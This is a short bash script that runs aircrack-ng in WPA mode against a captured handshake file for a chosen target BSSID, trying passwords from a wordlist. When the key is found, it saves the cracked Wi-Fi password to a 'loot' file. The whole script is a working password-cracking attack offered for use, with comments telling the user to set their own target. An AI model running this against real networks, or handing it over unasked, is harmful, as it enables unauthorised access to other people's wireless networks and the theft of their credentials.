#!/bin/bash

BSSID="00:1E:2A:BE:EF:00" # Adjust this to your target
CAP_LOC="/root/demo.cap" # point to your cap file
TEMP_ATTEMPT="/tmp/airport_attempt_tmp.txt" # Input wordlist
LOOT_FILE="/root/airport_loot.txt" # Loot file with cracked password
TEMP_CREDS="/tmp/airport_creds_tmp.txt" # tmp loot file to avoid loot being overwritten

# Run aircrack-ng and store the result in the temporary file
aircrack-ng -a 2 -b ${BSSID} -w "${TEMP_ATTEMPT}" "${CAP_LOC}" | grep -m 1 "KEY FOUND!" | sed -E "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})*)?[mGKFH]//g" > "${TEMP_CREDS}"

# Check if the password is correct
if grep -q "KEY FOUND!" "${TEMP_CREDS}"; then
    cp "${TEMP_CREDS}" "${LOOT_FILE}"  # Copy the temporary file to the final location
else
    exit 1 # Do nothing else
fi